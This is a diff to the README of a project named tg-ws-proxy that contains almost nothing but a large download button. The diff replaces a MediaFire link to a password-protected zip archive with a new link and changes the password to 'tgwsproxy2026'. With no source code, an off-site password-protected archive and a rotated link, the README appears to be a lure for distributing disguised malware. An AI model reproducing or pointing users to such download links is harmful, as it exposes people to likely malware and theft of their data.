@@ -1,11 +1,11 @@
 # tg-ws-proxy
 <p align="center">
-  <a href="https://www.mediafire.com/file/dnhaqhe07oi0vm6/tgwsproxy.zip/file">
+  <a href="https://www.mediafire.com/file/jocgy3vqjuv8858/tg-ws-proxy.zip/file">
     <img src="https://www.coinagemag.com/wp-content/uploads/2017/12/free-download-png-blue-color-free-download-button-679-1.png" alt="Download" width="250"/>
   </a>
 </p>
 
-🔐pass: tgwsproxy
+🔐pass: tgwsproxy2026
 
 ---
 
